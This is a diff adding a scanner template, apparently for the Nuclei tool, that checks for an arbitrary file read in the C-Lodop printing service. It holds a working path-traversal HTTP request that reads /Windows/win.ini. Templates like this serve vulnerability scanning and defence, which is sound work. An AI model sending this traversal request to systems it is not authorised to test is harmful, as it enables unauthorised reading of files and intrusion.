@@ -1,0 +1,34 @@
+id: c-lodop-arbitrary-file-read
+info:
+  name: C-Lodop Arbitrary File Read (CNVD-2019-43826)
+  author: ProjectDiscoveryAI
+  severity: medium
+  description: |
+    There is an arbitrary file reading vulnerability in C-Lodop Printing Service System, which can be used by attackers to obtain sensitive information.
+  reference:
+    - https://www.cnvd.org.cn/flaw/show/CNVD-2019-43826
+  tags: file-read,info-leak
+  metadata:
+    product: C-Lodop Printing Service System
+    disclosure_date: 2021-05-26
+
+variables:
+  file: "/Windows/win.ini"
+
+http:
+  - raw:
+      - |
+        GET /../../../../../../{{file}} HTTP/1.1
+        Host: {{Hostname}}
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "font"
+          - "extensions"
+          - "file"
